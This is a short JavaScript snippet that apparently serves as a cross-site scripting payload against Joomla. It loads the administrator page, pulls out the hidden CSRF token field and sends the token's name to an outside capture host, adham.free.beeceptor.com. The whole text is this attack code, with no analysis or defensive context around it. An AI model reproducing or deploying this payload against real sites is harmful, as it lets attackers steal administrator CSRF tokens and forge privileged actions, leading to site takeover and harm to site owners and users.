fetch('/administrator/index.php').then(r => r.text()).then(html => {
        var parser = new DOMParser();
        var doc = parser.parseFromString(html, 'text/html');
        // Find the Joomla CSRF token (usually 32 chars)
        var tokenInput = doc.querySelector('input[type="hidden"][name*="token"]');
        if (tokenInput) {
             fetch('https://adham.free.beeceptor.com/?token=' + tokenInput.name); }});
